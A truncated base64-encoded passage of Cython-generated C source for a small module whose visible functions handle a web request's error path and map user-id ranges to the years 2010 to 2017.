19weXhfdF8zKTsKICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMSwgX19weXhfdF8yLCBfX3B5eF90XzMpOwogICAgZ290byBfX3B5eF9MMV9lcnJvcjsKICAgIF9fcHl4X0w0X2V4Y2VwdGlvbl9oYW5kbGVkOjsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8zKTsKICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMSwgX19weXhfdF8yLCBfX3B5eF90XzMpOwogICAgX19weXhfTDhfdHJ5X2VuZDo7CiAgfQoKICAKICBfX1B5eF9YREVDUkVGKF9fcHl4X3IpOwogIF9fUHl4X0lOQ1JFRihfX3B5eF92X3IpOwogIF9fcHl4X3IgPSBfX3B5eF92X3I7CiAgZ290byBfX3B5eF9MMDsKCiAgCgogIAogIF9fcHl4X0wxX2Vycm9yOjsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTsKICBfX1B5eF9BZGRUcmFjZWJhY2soIm5lLnJlc3QiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICBfX3B5eF9yID0gTlVMTDsKICBfX3B5eF9MMDo7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2hlYWRlcnMpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9kYXRhKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfcmVzcG9uc2UpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9yKTsKICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQoKCgoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18ybmVfN2RhdGUoUHlPYmplY3QgKl9fcHl4X3NlbGYsIAojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZWxzZQpQeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2VuZGlmCik7IApzdGF0aWMgUHlNZXRob2REZWYgX19weXhfbWRlZl8ybmVfN2RhdGUgPSB7ImRhdGUiLCAoUHlDRnVuY3Rpb24pKHZvaWQoKikodm9pZCkpKF9fUHl4X1B5Q0Z1bmN0aW9uX0Zhc3RDYWxsV2l0aEtleXdvcmRzKV9fcHl4X3B3XzJuZV83ZGF0ZSwgX19QeXhfTUVUSF9GQVNUQ0FMTHxNRVRIX0tFWVdPUkRTLCAwfTsKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18ybmVfN2RhdGUoUHlPYmplY3QgKl9fcHl4X3NlbGYsIAojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZWxzZQpQeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2VuZGlmCikgewogIFB5T2JqZWN0ICpfX3B5eF92X0lkID0gMDsKICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMCiAgQ1lUSE9OX1VOVVNFRCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzOwogICNlbmRpZgogIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9rd3ZhbHVlczsKICBQeU9iamVjdCogdmFsdWVzWzFdID0gezB9OwogIGludCBfX3B5eF9saW5lbm8gPSAwOwogIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDsKICBpbnQgX19weXhfY2xpbmVubyA9IDA7CiAgUHlPYmplY3QgKl9fcHl4X3IgPSAwOwogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoImRhdGUgKHdyYXBwZXIpIiwgMCk7CiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTAogICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogIF9fcHl4X25hcmdzID0gUHlUdXBsZV9HRVRfU0laRShfX3B5eF9hcmdzKTsKICAjZWxzZQogIF9fcHl4X25hcmdzID0gUHlUdXBsZV9TaXplKF9fcHl4X2FyZ3MpOyBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgPCAwKSkgcmV0dXJuIE5VTEw7CiAgI2VuZGlmCiAgI2VuZGlmCiAgX19weXhfa3d2YWx1ZXMgPSBfX1B5eF9Ld1ZhbHVlc19GQVNUQ0FMTChfX3B5eF9hcmdzLCBfX3B5eF9uYXJncyk7CiAgewogICAgUHlPYmplY3QgKiogY29uc3QgX19weXhfcHlhcmduYW1lc1tdID0geyZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfSWQsMH07CiAgICBjb25zdCBQeV9zc2l6ZV90IF9fcHl4X2t3ZHNfbGVuID0gKF9fcHl4X2t3ZHMpID8gX19QeXhfTnVtS3dhcmdzX0ZBU1RDQUxMKF9fcHl4X2t3ZHMpIDogMDsKICAgIGlmICh1bmxpa2VseShfX3B5eF9rd2RzX2xlbikgPCAwKSBfX1BZWF9FUlIoMCwgMTk5LCBfX3B5eF9MM19lcnJvcikKICAgIGlmIChfX3B5eF9rd2RzX2xlbiA+IDApIHsKICAgICAgc3dpdGNoIChfX3B5eF9uYXJncykgewogICAgICAgIGNhc2UgIDE6CiAgICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApOwogICAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDE5OSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIOwogICAgICAgIGNhc2UgIDA6IGJyZWFrOwogICAgICAgIGRlZmF1bHQ6IGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7CiAgICAgIH0KICAgICAgY29uc3QgUHlfc3NpemVfdCBrd2RfcG9zX2FyZ3MgPSBfX3B5eF9uYXJnczsKICAgICAgaWYgKF9fUHl4X1BhcnNlS2V5d29yZHMoX19weXhfa3dkcywgX19weXhfa3d2YWx1ZXMsIF9fcHl4X3B5YXJnbmFtZXMsIDAsIHZhbHVlcywga3dkX3Bvc19hcmdzLCBfX3B5eF9rd2RzX2xlbiwgImRhdGUiLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE5OSwgX19weXhfTDNfZXJyb3IpCiAgICAgIGZvciAoUHlfc3NpemVfdCBpID0gX19weXhfbmFyZ3M7IGkgPCAxOyBpKyspIHsKICAgICAgICBpZiAodW5saWtlbHkoIXZhbHVlc1tpXSkpIHsgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoImRhdGUiLCAxLCAxLCAxLCBpKTsgX19QWVhfRVJSKDAsIDE5OSwgX19weXhfTDNfZXJyb3IpIH0KICAgICAgfQogICAgfSBlbHNlIGlmICh1bmxpa2VseShfX3B5eF9uYXJncyAhPSAxKSkgewogICAgICBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOwogICAgfSBlbHNlIHsKICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApOwogICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAxOTksIF9fcHl4X0wzX2Vycm9yKQogICAgfQogICAgX19weXhfdl9JZCA9IHZhbHVlc1swXTsKICB9CiAgZ290byBfX3B5eF9MNl9za2lwOwogIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOjsKICBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgiZGF0ZSIsIDEsIDEsIDEsIF9fcHl4X25hcmdzKTsgX19QWVhfRVJSKDAsIDE5OSwgX19weXhfTDNfZXJyb3IpCiAgX19weXhfTDZfc2tpcDo7CiAgZ290byBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTsKICBfX3B5eF9MM19lcnJvcjo7CiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkgewogICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pOwogIH0KICBfX1B5eF9BZGRUcmFjZWJhY2soIm5lLmRhdGUiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gTlVMTDsKICBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTo7CiAgX19weXhfciA9IF9fcHl4X3BmXzJuZV82ZGF0ZShfX3B5eF9zZWxmLCBfX3B5eF92X0lkKTsKCiAgCiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkgewogICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pOwogIH0KICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8ybmVfNmRhdGUoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3ZfSWQpIHsKICBQeU9iamVjdCAqX19weXhfdl91aWQgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIFB5T2JqZWN0ICpfX3B5eF90XzEgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzIgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzMgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMOwogIGludCBfX3B5eF90XzU7CiAgaW50IF9fcHl4X3RfNjsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJkYXRlIiwgMCk7CgogIAogIHsKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfMSwgJl9fcHl4X3RfMiwgJl9fcHl4X3RfMyk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7CiAgICAgewoKICAgICAgCiAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5TnVtYmVyX0ludChfX3B5eF92X0lkKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjAxLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgIF9fcHl4X3ZfdWlkID0gKChQeU9iamVjdCopX19weXhfdF80KTsKICAgICAgX19weXhfdF80ID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMSwgX19weXhfdl91aWQsIFB5X0xUKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMDIsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCkpIHsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsKICAgICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X3VpZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEyNzkwMDAsIFB5X0xUKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMDIsIF9fcHl4X0wzX2Vycm9yKQogICAgICB9CiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfNSA8IDApKSkgX19QWVhfRVJSKDAsIDIwMiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICBpZiAoX19weXhfdF81KSB7CgogICAgICAgIAogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfcik7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDEwKTsKICAgICAgICBfX3B5eF9yID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTA7CiAgICAgICAgZ290byBfX3B5eF9MN190cnlfcmV0dXJuOwoKICAgICAgICAKICAgICAgfQoKICAgICAgCiAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xMjc5MDAxLCBfX3B5eF92X3VpZCwgUHlfTEUpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDIwNCwgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF80KSkgewogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOwogICAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3ZfdWlkLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMTc3NTAwMDAsIFB5X0xUKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMDQsIF9fcHl4X0wzX2Vycm9yKQogICAgICB9CiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfNSA8IDApKSkgX19QWVhfRVJSKDAsIDIwNCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICBpZiAoX19weXhfdF81KSB7CgogICAgICAgIAogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfcik7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDExKTsKICAgICAgICBfX3B5eF9yID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTE7CiAgICAgICAgZ290byBfX3B5eF9MN190cnlfcmV0dXJuOwoKICAgICAgICAKICAgICAgfQoKICAgICAgCiAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xNzc1MDAwMSwgX19weXhfdl91aWQsIFB5X0xFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMDYsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCkpIHsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsKICAgICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X3VpZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzI3OTc2MDAwMCwgUHlfTFQpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDIwNiwgX19weXhfTDNfZXJyb3IpCiAgICAgIH0KICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSgoX19weXhfdF81IDwgMCkpKSBfX1BZWF9FUlIoMCwgMjA2LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgIGlmIChfX3B5eF90XzUpIHsKCiAgICAgICAgCiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF9yKTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTIpOwogICAgICAgIF9fcHl4X3IgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAxMjsKICAgICAgICBnb3RvIF9fcHl4X0w3X3RyeV9yZXR1cm47CgogICAgICAgIAogICAgICB9CgogICAgICAKICAgICAgX19weXhfdF80ID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzI3OTc2MDAwMSwgX19weXhfdl91aWQsIFB5X0xFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMDgsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCkpIHsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsKICAgICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X3VpZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzkwMDk5MDAwMCwgUHlfTFQpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDIwOCwgX19weXhfTDNfZXJyb3IpCiAgICAgIH0KICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSgoX19weXhfdF81IDwgMCkpKSBfX1BZWF9FUlIoMCwgMjA4LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgIGlmIChfX3B5eF90XzUpIHsKCiAgICAgICAgCiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF9yKTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTMpOwogICAgICAgIF9fcHl4X3IgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAxMzsKICAgICAgICBnb3RvIF9fcHl4X0w3X3RyeV9yZXR1cm47CgogICAgICAgIAogICAgICB9CgogICAgICAKICAgICAgX19weXhfdF80ID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzkwMDk5MDAwMSwgX19weXhfdl91aWQsIFB5X0xFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMTAsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCkpIHsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsKICAgICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X3VpZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzE2MjkwMTAwMDAsIFB5X0xUKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMTAsIF9fcHl4X0wzX2Vycm9yKQogICAgICB9CiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfNSA8IDApKSkgX19QWVhfRVJSKDAsIDIxMCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICBpZiAoX19weXhfdF81KSB7CgogICAgICAgIAogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfcik7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDE0KTsKICAgICAgICBfX3B5eF9yID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTQ7CiAgICAgICAgZ290byBfX3B5eF9MN190cnlfcmV0dXJuOwoKICAgICAgICAKICAgICAgfQoKICAgICAgCiAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xOTAwMDAwMDAwLCBfX3B5eF92X3VpZCwgUHlfTEUpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDIxMiwgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF80KSkgewogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOwogICAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3ZfdWlkLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjUwMDAwMDAwMCwgUHlfTFQpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDIxMiwgX19weXhfTDNfZXJyb3IpCiAgICAgIH0KICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSgoX19weXhfdF81IDwgMCkpKSBfX1BZWF9FUlIoMCwgMjEyLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgIGlmIChfX3B5eF90XzUpIHsKCiAgICAgICAgCiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF9yKTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTUpOwogICAgICAgIF9fcHl4X3IgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAxNTsKICAgICAgICBnb3RvIF9fcHl4X0w3X3RyeV9yZXR1cm47CgogICAgICAgIAogICAgICB9CgogICAgICAKICAgICAgX19weXhfdF80ID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzI1MDAwMDAwMDAsIF9fcHl4X3ZfdWlkLCBQeV9MRSk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF80KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjE0LCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpKSB7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7CiAgICAgICAgX19weXhfdF80ID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfdl91aWQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8zNzEzNjY4Nzg2LCBQeV9MVCk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF80KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjE0LCBfX3B5eF9MM19lcnJvcikKICAgICAgfQogICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF80KTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzUgPCAwKSkpIF9fUFlYX0VSUigwLCAyMTQsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgaWYgKF9fcHl4X3RfNSkgewoKICAgICAgICAKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3IpOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAxNik7CiAgICAgICAgX19weXhfciA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDE2OwogICAgICAgIGdvdG8gX19weXhfTDdfdHJ5X3JldHVybjsKCiAgICAgICAgCiAgICAgIH0KCiAgICAgIAogICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMzcxMzY2ODc4NiwgX19weXhfdl91aWQsIFB5X0xFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMTYsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCkpIHsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsKICAgICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X3VpZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzU2OTk3ODUyMTcsIFB5X0xUKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMTYsIF9fcHl4X0wzX2Vycm9yKQogICAgICB9CiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfNSA8IDApKSkgX19QWVhfRVJSKDAsIDIxNiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICBpZiAoX19weXhfdF81KSB7CgogICAgICAgIAogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfcik7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDE3KTsKICAgICAgICBfX3B5eF9yID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTc7CiAgICAgICAgZ290byBfX3B5eF9MN190cnlfcmV0dXJuOwoKICAgICAgICAKICAgICAgfQoKICAgICAgCiAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X21zdGF0ZV